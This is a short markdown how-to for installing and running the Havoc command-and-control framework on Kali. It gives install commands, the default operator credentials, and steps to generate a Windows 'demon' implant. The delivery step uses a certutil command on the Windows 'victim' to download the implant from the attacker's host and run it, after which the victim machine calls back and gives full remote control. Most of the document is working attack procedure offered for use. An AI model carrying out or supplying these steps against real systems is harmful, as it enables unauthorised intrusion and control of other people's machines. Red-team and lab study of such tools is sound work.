# Havoc C2 — Installation & Usage

## What is Havoc

Havoc is a Command & Control (C2) framework.

- You run it on Kali
- It generates a payload called a **demon** — a Windows executable
- Once the demon runs on a victim machine it calls back to your Kali
- You get full remote control through the Havoc GUI

**Three parts — all on Kali except the demon:**

| Part | Where it runs | What it does |
|---|---|---|
| Team server | Kali | C2 backend, receives connections from victims |
| Client (GUI) | Kali | Operator dashboard — listeners, payloads, commands |
| Demon (agent) | Windows victim | Payload that runs on target and calls back to Kali |

The Windows machine never runs Havoc itself — only the demon you generate.

---

## Install (Kali package — use this)

```bash
sudo apt install -y havoc
```

Files land in `/usr/share/havoc/`.

---

## Run

```bash
# Terminal 1 — team server (must run as root)
cd /usr/share/havoc
sudo havoc server --profile profiles/havoc.yaotl

# Terminal 2 — client GUI
cd /usr/share/havoc
havoc client
```

Default credentials (from `profiles/havoc.yaotl`):
- User: `5pider` or `Neo`
- Password: `password1234`
- Host: `127.0.0.1` Port: `40056`

---

## Generate and Deploy a Demon

1. In Havoc client: **View → Listeners → Add**
   - Protocol: HTTP
   - Host: `<KALI_IP>`
   - Port: 80

2. **Attack → Payload → Generate**
   - Format: Windows EXE
   - Listener: select the one you just created
   - Save as `demon.exe`

3. Host and deliver to Windows victim:
```bash
# Kali — host the payload
python3 -m http.server 8080 --directory ~/Desktop/

# Windows VM — cmd as Admin
certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
C:\Windows\Temp\demon.exe
```

4. Demon runs → calls back to Kali → session appears in Havoc client → right-click → Interact
